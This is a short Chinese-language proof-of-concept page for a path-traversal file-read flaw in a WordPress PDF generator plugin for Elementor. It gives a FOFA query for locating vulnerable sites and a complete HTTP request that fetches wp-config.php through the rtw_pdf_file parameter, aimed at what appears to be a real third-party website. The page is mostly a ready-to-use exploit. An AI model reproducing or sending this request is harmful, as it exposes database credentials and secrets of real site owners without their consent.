# WordPress插件rtw_pdf_file任意文件读取漏洞

WordPress插件rtw_pdf_file任意文件读取漏洞，适用于 WordPress 的 Elementor Page Builder 插件的 PDF 生成器插件在 1.7.5 之前的所有版本中都容易受到路径遍历的攻击，包括 1.7.5 rtw_pgaepb_dwnld_pdf（） 函数。这使得未经身份验证的攻击者能够读取服务器上任意文件的内容，其中可能包含敏感信息。

## fofa
```javascript
"wp-content/plugins/pdf-generator-addon-for-elementor-page-builder"
```

## poc
```javascript
GET /?rtw_pdf_file=../../../wp-config.php&rtw_generate_pdf=1 HTTP/1.1
Host: korurealestate.co.uk
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```

![image-20241227211927240](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412272119351.png)